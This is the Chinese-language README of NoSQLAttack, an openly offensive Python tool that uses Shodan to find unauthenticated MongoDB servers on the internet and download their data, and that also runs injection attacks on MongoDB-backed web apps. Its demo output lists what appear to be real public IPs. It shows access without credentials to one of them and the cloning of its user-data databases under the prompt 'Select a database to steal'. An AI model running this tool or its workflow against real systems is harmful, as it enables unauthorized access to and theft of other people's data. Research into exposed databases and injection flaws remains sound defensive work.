#NoSQLAttack

#介绍
NoSQLAttack 是一个用python编写的开源的攻击工具，用来暴露网络中默认配置mongoDB的IP并且下载目标mongoDB的数据，同时还可以针对以mongoDB为后台存储的应用进行注入攻击，使用这个工具就可以发现有成千上万的mongoDB裸奔在互联网上，并且数据可以随意下载。

这个攻击工具是基于tcstool的[NoSQLMap](http://www.nosqlmap.net/index.html)和搜索引擎[shodan](https://www.shodan.io/)

一些攻击的数据是来自于以下论文给予的启发
* [Diglossia: Detecting Code Injection Attacks with Precision and Efficiency](http://www.cs.cornell.edu/~shmat/shmat_ccs13.pdf)
* [No SQL, No Injection?](https://www.research.ibm.com/haifa/Workshops/security2015/present/Aviv_NoSQL-NoInjection.pdf)
* [Several thousand MongoDBs without access control on the Internet](https://cispa.saarland/wp-content/uploads/2015/02/MongoDB_documentation.pdf).


NoSQL注入攻击测试系统[NoSQLInjectionAttackDemo](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo)，这里面有两个系统用来测试注入攻击。
#背景介绍
在NoSQL注入攻击中有PHP数组注入，js注入和mongo shell拼接注入等多种方法可以攻击mongoDB，并且现在有成千上万的mongoDB暴露在互联网上，只要知道目标mongoDB的ip和端口号就可以把裸露的mongoDB中的数据都下载下来。
#运行环境
项目运行在linux系统上，NoSQLAttack的依赖包已经写在setup.py文件里，并且已经在ubantu和MAC OX上都测试了，只需要执行这个脚本就可以自动配置好安装环境
开发这个项目使用时使用的是Pycharm COMMUNITY 2016.1，python的版本为2.7.10，使用者需要在本地电脑安装[mongoDB](http://jingyan.baidu.com/article/fd8044faf4f3a95030137a79.html)。

#安装
在linux系统下可以直接将下载的项目解压，然后执行以下两个命令
```bash
cd NoSQLAttack
python setup.py install
```
#使用方法
安装完毕后，执行一下命令就可以启动该项目
```bash
NoSQLAttack
```
启动该项目后将会展现如下的界面，然后就可以开启黑客之旅了
```bash
================================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |    _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |_   | |_  | |_| | | |__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
================================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
```
#选项1扫描可攻击IP演示 
```bash
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:1
Start Scanning.....
Results found:28793
1_Attacked IP : 149.202.88.135
2_Attacked IP : 49.212.186.80
3_Attacked IP : 85.9.62.231
4_Attacked IP : 121.78.239.11
5_Attacked IP : 54.226.207.112
6_Attacked IP : 119.254.66.44
7_Attacked IP : 121.46.0.83
8_Attacked IP : 162.243.21.180
9_Attacked IP : 210.23.29.75
Select IP to attack:2
Start Default Configuration Attack(y/n)?y
DB access attacks(mongoDB)
=========================
Checking to see if crendentials are need
49.212.186.80

27017
Successful access with no credentials!


1-Get Server Version and Platform
2-Enumerate Databases/Collections/Users
3-Clone a Database
4-Return to Main Menu
Select an attack: 2
List of databases:
MultiCopyService_UserData
SmartNFC_UserData
SmartShop_UserData
KioskPointMng2_UserData
admin
db
local

1-Get Server Version and Platform
2-Enumerate Databases/Collections/Users
3-Clone a Database
4-Return to Main Menu
Select an attack: 3


(1)MultiCopyService_UserData
(2)SmartNFC_UserData
(3)SmartShop_UserData
(4)KioskPointMng2_UserData
(5)admin
(6)db
(7)dbItem
(8)local
Select a database to steal:6
Does this Database require credentials.(y/n)?n
Database cloned. Copy another (y/n)?

```
#选项2系统配置信息演示 
这里以这个攻击地址为例(219.223.240.36/NoSQLInjectionAttackDemo/demo_2.html)，这里的IP：219.223.240.36 下部署了web服务器在我本地的电脑，所以外网是访问不了的，这个用于测试的web站点的源码在这个项目里[NoSQLInjectionAttackDemo](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo). 使用者可以自己搭建一个web服务器然后将这个项目[NoSQLInjectionAttackDemo](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo)的代码放上去就可以运行了，然后将这个IP219.223.240.36换成搭建好的web服务器的IP。
```bash
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:2

Options
1-Set target host/IP (Current: Not Set)
2-Set web app port (Current: 80)
3-Set App Path (Current: Not Set)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: Not Set)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:1
Enter host or IP/DNS name:219.223.240.36

Target set to:219.223.240.36




Options
1-Set target host/IP (Current: 219.223.240.36)
2-Set web app port (Current: 80)
3-Set App Path (Current: Not Set)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: Not Set)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:3
Enter URL path(Press enter for no URL):/NoSQLInjectionAttackDemo/login/demo_2.php?password=2

HTTP port set to 80




Options
1-Set target host/IP (Current: 219.223.240.36)
2-Set web app port (Current: 80)
3-Set App Path (Current: /NoSQLInjectionAttackDemo/login/demo_2.php?password=2)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: Not Set)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:7
Enter host IP for my Not Set/Shells:127.0.0.1

Shell/DB listener set to 127.0.0.1




Options
1-Set target host/IP (Current: 219.223.240.36)
2-Set web app port (Current: 80)
3-Set App Path (Current: /NoSQLInjectionAttackDemo/login/demo_2.php?password=2)
4-Toggle HTTPS (Current: OFF)
5-Set Not Set Port (Current : 27017)
6-Set HTTP Request Method (GET/POST) (Current: GET)
7-Set my local Not Set/Shell IP (Current: 127.0.0.1)
8-Set shell listener port (Current: Not Set)
9-Toggle Verbose Mode: (Current: OFF)
x-Back to main menu
Set an option:x
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:4
Web App Attacks (GET)
=====================
checking to see if site at219.223.240.36:80/NoSQLInjectionAttackDemo/login/demo_2.php?password=2 is up...


```
